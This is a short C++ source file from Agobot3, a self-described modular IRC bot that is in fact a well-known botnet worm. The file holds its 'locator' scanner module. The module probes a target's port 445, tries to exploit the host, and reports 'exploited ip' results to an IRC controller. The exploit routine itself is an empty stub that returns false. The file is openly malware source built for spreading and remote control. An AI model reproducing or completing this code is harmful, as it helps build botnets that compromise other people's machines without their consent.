/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "locscanner.h"
#include "mainctrl.h"
#include "utility.h"

/*
		Locator Scanner starts here
		scans for locator exploit
*/

CScannerLocator::CScannerLocator() { m_sScannerName.Assign("locator"); }
void CScannerLocator::StartScan(const CString &sHost)
{	bool bSuccess=false;

#ifdef WIN32
	if(ScanPort(sHost.CStr(), 445))
	{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scanning ip %s:445.", m_sScannerName.CStr(), sHost.CStr());
		bSuccess=Exploit(sHost); }
#endif

	// Success
	if(bSuccess) g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
		"%s: exploited ip %s.", m_sScannerName.CStr(), sHost.CStr()); }

bool CScannerLocator::Exploit(const CString &sHost)
{
#ifdef WIN32
	return false;
#endif
}

